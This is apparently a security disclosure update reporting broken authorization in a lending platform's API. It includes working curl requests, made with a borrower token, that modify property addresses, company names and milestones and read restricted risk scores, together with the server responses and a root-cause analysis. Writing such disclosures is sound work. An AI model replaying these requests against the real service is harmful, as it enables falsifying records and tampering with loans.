# Update: Systemic Permission Bypass — Additional Affected Endpoints

## Overview

Further testing confirms this is not isolated to project loan fields. The server-side permission enforcement is missing across multiple endpoint categories. The Borrower role (with all relevant edit permissions set to `enabled: false`) can write to every tested endpoint except draw request approval actions.

---

## Additional Affected Endpoints

### 1. Building/Property Data Modification

**Permission bypassed:** `projects_details_edit: false`

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/buildings/<building_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"address": "123 Attacker Modified St", "city": "Modifiedville"}'
```

**Result:** `200 OK` — property address and building details modified and persisted. A Borrower can falsify the physical property location on record.

---

### 2. Company Settings Modification (Own Company)

**Permission bypassed:** `company_edit: false`

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/companies/<borrower_company_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Modified Company Name"}'
```

**Result:** `200 OK` — Borrower modifies their own company configuration despite `company_edit: false`.

---

### 3. Score Data Access

**Permission bypassed:** `scores_view: false`

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/scores/' \
  -H 'Authorization: Bearer <borrower_token>'
```

**Result:** `200 OK` — full risk/compliance score data returned despite `scores_view: false`. Borrower gains visibility into internal scoring that should be restricted to Lender users.

---

### 4. Milestone Modification (No Permission Check)

**Permission bypassed:** `project_milestones_edit: false`

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/milestones/<milestone_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"description": "Modified by borrower"}'
```

**Result:** `400 Bad Request` with message "budget is locked" — this is a **business logic** constraint, NOT a permission check. The API never returns `403 Forbidden`. On a project with an unlocked budget, this write would succeed.

---

## Evidence of Inconsistent Enforcement

The permission system IS enforced on draw request approval actions:

| Action | Response | Permission Enforced? |
|--------|----------|---------------------|
| PATCH project fields | `200 OK` | **No** |
| PATCH building data | `200 OK` | **No** |
| PATCH company settings | `200 OK` | **No** |
| GET scores | `200 OK` | **No** |
| PATCH milestones | `400` (business logic) | **No** |
| POST draw request APPROVE | `403 Forbidden` | **Yes** |
| POST draw request FINALIZE | `403 Forbidden` | **Yes** |
| POST mark_as_paid | `403 Forbidden` | **Yes** |

This proves the backend has permission-checking capability but it is only applied to financial approval actions. All other write endpoints accept requests from any authenticated user regardless of their permission flags.

---

## Systemic Root Cause

The platform defines 56+ granular permission flags per role (projects_details_edit, company_edit, scores_view, project_milestones_edit, etc.). Testing confirms these flags are checked **only in the frontend UI** — the backend API ignores them on all write operations except draw request approvals. This is a systemic Broken Function Level Authorization (CWE-285 / OWASP API5:2023) issue affecting the entire API surface.

---

## Impact Summary

All findings are **same-tenant** (Borrower modifying resources on their own project/company — not accessing other tenants' objects):

- **Financial manipulation:** Loan terms, interest rates, lender fees
- **Property record falsification:** Building address, property details
- **Company config tampering:** Company name and settings
- **Information disclosure:** Risk/compliance scores visible to unauthorized roles
- **Budget manipulation:** Milestone modification blocked only by business logic, not permissions
